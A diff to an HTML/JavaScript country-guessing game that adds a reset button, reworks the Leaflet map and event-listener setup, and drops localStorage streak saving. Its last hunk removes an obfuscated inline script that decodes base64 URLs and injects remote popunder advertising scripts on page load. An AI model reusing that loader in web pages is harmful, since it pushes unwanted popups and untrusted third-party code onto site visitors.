@@ -144,6 +144,7 @@
     cursor: pointer;
     font-size: 1em;
     border-radius: 6px;
+    margin-right: 10px;
   }
   #dailyLimitMsg {
     background: #ffd3d3;
@@ -168,6 +169,20 @@
   #newGameBtn:hover {
     background: #f57c00;
   }
+  #resetBtn {
+    background: #dc3545;
+    color: white;
+    border: none;
+    padding: 8px 14px;
+    cursor: pointer;
+    font-size: 1em;
+    border-radius: 6px;
+    margin: 10px auto;
+    display: block;
+  }
+  #resetBtn:hover {
+    background: #c82333;
+  }
 </style>
 </head>
 <body>
@@ -186,6 +201,7 @@
 </form>
 <div id="feedback"></div>
 <div id="streak">🔥 Streak: 0</div>
+<button id="resetBtn">🔄 Reset Game</button>
 <div id="history">
   <h3>Guess History</h3>
   <ul id="historyList"></ul>
@@ -448,10 +464,15 @@ let currentClueIndex = 0;
 let guessHistory = [];
 let gameEnded = false;
 let currentStreak = 0;
+let worldMap = null;
 
 // Initialize the game
 function initGame() {
-  // Initialize the world map
+  // Initialize or reset the world map
+  if (worldMap) {
+    worldMap.remove();
+    worldMap = null;
+  }
   initWorldMap();
   
   // Get random question
@@ -473,15 +494,22 @@ function initGame() {
   document.getElementById('historyList').innerHTML = '';
   document.getElementById('endScreen').style.display = 'none';
   
-  // Set up form submission
-  document.getElementById('guessForm').addEventListener('submit', handleGuess);
-  
   // Focus on input
   document.getElementById('guessInput').focus();
   
-  // Load streak from localStorage
-  currentStreak = parseInt(localStorage.getItem('geodleStreak') || '0');
+  // Load streak from memory (not using localStorage in artifacts)
   updateStreakDisplay();
+}
+
+function resetGame() {
+  // Reset streak to 0
+  currentStreak = 0;
+  
+  // Initialize a new game
+  initGame();
+  
+  // Show reset confirmation
+  showFeedback('🔄 Game reset! New country selected.', '#0078d7');
 }
 
 function updateClueDisplay() {
@@ -500,7 +528,7 @@ function updateStreakDisplay() {
 
 // Initialize Leaflet world map
 function initWorldMap() {
-  const map = L.map('worldMap', {
+  worldMap = L.map('worldMap', {
     center: [20, 0],
     zoom: 2,
     zoomControl: false,
@@ -513,7 +541,7 @@ function initWorldMap() {
   L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
     attribution: '© OpenStreetMap contributors',
     maxZoom: 18
-  }).addTo(map);
+  }).addTo(worldMap);
 
   // Add some visual flair with markers for major cities
   const majorCities = [
@@ -533,7 +561,7 @@ function initWorldMap() {
       weight: 1,
       opacity: 1,
       fillOpacity: 0.8
-    }).addTo(map);
+    }).addTo(worldMap);
   });
 }
 
@@ -559,7 +587,6 @@ function handleGuess(e) {
   if (isCorrect) {
     showFeedback(`🎉 Correct! The answer is ${currentQuestion.answer}`, 'green');
     currentStreak++;
-    localStorage.setItem('geodleStreak', currentStreak.toString());
     updateStreakDisplay();
     endGame(true);
   } else {
@@ -571,7 +598,6 @@ function handleGuess(e) {
     } else {
       showFeedback(`😔 Game Over! The answer was ${currentQuestion.answer}`, 'orange');
       currentStreak = 0;
-      localStorage.setItem('geodleStreak', '0');
       updateStreakDisplay();
       endGame(false);
     }
@@ -620,10 +646,6 @@ function endGame(won) {
   }
   
   endScreen.style.display = 'block';
-  
-  // Set up share button
-  document.getElementById('shareBtn').addEventListener('click', shareScore);
-  document.getElementById('newGameBtn').addEventListener('click', initGame);
 }
 
 function shareScore() {
@@ -647,13 +669,15 @@ function shareScore() {
 }
 
 // Start the game when page loads
-document.addEventListener('DOMContentLoaded', initGame);
+document.addEventListener('DOMContentLoaded', function() {
+  initGame();
+  
+  // Set up event listeners
+  document.getElementById('guessForm').addEventListener('submit', handleGuess);
+  document.getElementById('resetBtn').addEventListener('click', resetGame);
+  document.getElementById('shareBtn').addEventListener('click', shareScore);
+  document.getElementById('newGameBtn').addEventListener('click', initGame);
+});
 </script>
-<script type="text/javascript" data-cfasync="false">
-/*<![CDATA[/* */
-(function(){var d=window,b="bf128af1619960cff9b8bb4a42e55104",y=[["siteId",263*34*498+802+766811],["minBid",0.00000001],["popundersPerIP","9999999,9999999"],["delayBetween",0],["default","https://2048-unblocked.netlify.app/"],["defaultPerDay",1],["topmostLayer","auto"]],m=["d3d3LmJldHRlcmFkc3lzdGVtLmNvbS9jaG9wc2NvdGNoLm1pbi5jc3M=","ZDJrazBvM2ZyN2VkMDEuY2xvdWRmcm9udC5uZXQvdHpKUE8vYWN1c3RvbS5taW4uanM="],s=-1,p,l,h=function(){clearTimeout(l);s++;if(m[s]&&!(1779161127000<(new Date).getTime()&&1<s)){p=d.document.createElement("script");p.type="text/javascript";p.async=!0;var o=d.document.getElementsByTagName("script")[0];p.src="https://"+atob(m[s]);p.crossOrigin="anonymous";p.onerror=h;p.onload=function(){clearTimeout(l);d[b.slice(0,16)+b.slice(0,16)]||h()};l=setTimeout(h,5E3);o.parentNode.insertBefore(p,o)}};if(!d[b]){try{Object.freeze(d[b]=y)}catch(e){}h()}})();
-/*]]>/* */
-</script>
-
 </body>
 </html>
